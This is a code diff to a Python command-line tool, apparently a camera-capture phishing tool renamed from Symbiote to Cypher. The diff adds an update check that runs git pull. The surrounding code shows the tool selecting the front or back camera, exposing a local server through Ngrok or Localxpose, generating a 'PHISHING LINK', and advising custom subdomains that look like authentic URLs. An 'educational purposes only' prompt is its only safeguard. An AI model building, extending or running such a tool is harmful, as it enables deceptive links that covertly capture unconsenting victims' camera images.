@@ -17,6 +17,16 @@ from Checks import *
 from logo import *
 #hiiii
 
+# --- Version Info ---
+try:
+    with open('version.txt', 'r') as f:
+        CURRENT_VERSION = f.read().strip()
+except FileNotFoundError:
+    CURRENT_VERSION = "Unknown"
+
+REPO_URL = "https://raw.githubusercontent.com/AsHfIEXE/Cypher/main/version.txt"
+# --- End Version Info ---
+
 # Platform detection
 is_windows = platform.system() == "Windows"
 is_linux = platform.system() == "Linux"
@@ -44,7 +54,7 @@ def menu_q():
     print('            {5}                                                 \n               |  {2}"{3}UNIX IS VERY SIMPLE {2}IT JUST NEEDS A{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print('               {5}|  {2}GENIUS TO UNDERSTAND ITS SIMPLICITY"{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("               {5}|                       {0}~{3}Dennis Ritchie{5}  |\n{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
+    if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
         sleep(0.5)
     else:
         print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
@@ -52,7 +62,7 @@ def menu_q():
 def div_q(): #not in using 
     global user
     clear_screen()
-    if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
+    if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
           android_banner()
           user = '1'
           sleep(7)
@@ -73,7 +83,7 @@ def option():
     sbanner()
     print("\n{5}----------------------------------\n{0}[{2} FRONT CAMERA  OR BACK CAMERA {5}??{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("{0}[{2}1{0}]{2} FRONT CAMERA \n{0}[{2}2{0}]{2} BACK CAMERA{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+    choice = input("\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     global name
     if choice == '1':
         name = 'www_f'
@@ -95,7 +105,7 @@ def selectPort():
     clear_screen()
     sbanner()
     print("\n\n{5}--------------------------------------\n{0}[{2} Select Any Available Port [1-65535]:{0}] \n{5}--------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input(" {0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
+    choice = input(" {0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
     try:
         port = int(choice)
         if 1 <= port <= 65535:
@@ -148,7 +158,7 @@ def runNgrok(port):
 def customLocalxpose(port):
     global tunnel_process
     sbanner()
-    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}] {2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}]{2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     
@@ -258,7 +268,7 @@ def selectServer(port):
     print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
     print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+    choice = input("\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     if choice == '1':
         clear_screen()
         king=1
@@ -273,7 +283,7 @@ def selectServer(port):
         print("\n\n{5}----------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
         print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
         print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        ichoice = input("\n\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
+        ichoice = input("\n\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
         clear_screen()
         if ichoice == '1': 
             king=3
@@ -389,7 +399,7 @@ def report(url,port):
                             with open(log_file_path, 'r') as log_f:
                                 print(log_f.read())
             
-            ans=input("{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,"")).upper()
+            ans=input("{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,"")).upper()
             if (ans == "X"):
                 cleanup()
                 fresh()
@@ -412,19 +422,62 @@ def report(url,port):
         cleanup()
         exit()
 
-clear_screen()
-# verCheck() # This can be slow, disabling for now.
-# try:
-#     if is_linux:
-#         system('termux-open https://github.com/hasanfirnas/symbiote &>/dev/null')
-# except:
-#     pass
+def check_for_updates():
+    """Checks for updates and prompts the user to update if available."""
+    if not path.exists('.git'):
+        print(f"{YELLOW}[!] Not a git repository. Skipping update check.{DEFAULT}")
+        sleep(2)
+        return
 
+    if CURRENT_VERSION == "Unknown":
+        print(f"{YELLOW}[!] Could not determine current version. Skipping update check.{DEFAULT}")
+        sleep(2)
+        return
+
+    print(f"{GREEN}[*] Current version: {CYAN}{CURRENT_VERSION}{DEFAULT}")
+    print(f"{GREEN}[*] Checking for updates...{DEFAULT}")
+    sleep(1)
+    
+    try:
+        response = requests.get(REPO_URL, timeout=10)
+        response.raise_for_status()
+        latest_version = response.text.strip()
+
+        if latest_version > CURRENT_VERSION:
+            print(f"{YELLOW}[!] A new version ({CYAN}{latest_version}{YELLOW}) is available!{DEFAULT}")
+            choice = input(f"{YELLOW}[?] Do you want to update now? (y/n): {DEFAULT}").lower()
+            if choice == 'y':
+                print(f"{GREEN}[*] Attempting to update via 'git pull'...{DEFAULT}")
+                try:
+                    result = subprocess.run(['git', 'pull'], check=True, capture_output=True, text=True)
+                    print(f"{GREEN}{result.stdout}{DEFAULT}")
+                    print(f"{GREEN}[*] Update successful! Please restart the script.{DEFAULT}")
+                    exit()
+                except FileNotFoundError:
+                    print(f"{RED}[!] 'git' command not found. Please install Git and try again.{DEFAULT}")
+                    sleep(3)
+                except subprocess.CalledProcessError as e:
+                    print(f"{RED}[!] An error occurred during update: {e.stderr}{DEFAULT}")
+                    print(f"{YELLOW}[!] Please try updating manually by running 'git pull'.{DEFAULT}")
+                    sleep(3)
+                except Exception as e:
+                    print(f"{RED}[!] An unexpected error occurred: {e}{DEFAULT}")
+                    sleep(3)
+        else:
+            print(f"{GREEN}[*] You are on the latest version.{DEFAULT}")
+            sleep(1)
+
+    except requests.exceptions.RequestException as e:
+        print(f"{RED}[!] Could not check for updates: {e}{DEFAULT}")
+        sleep(2)
+
+clear_screen()
+check_for_updates()
 # menu_q()
 global kill
 clear_screen()
 # sbanner()
-if not is_windows and input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
+if not is_windows and input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
     android_banner()
     kill = '1'
 else:
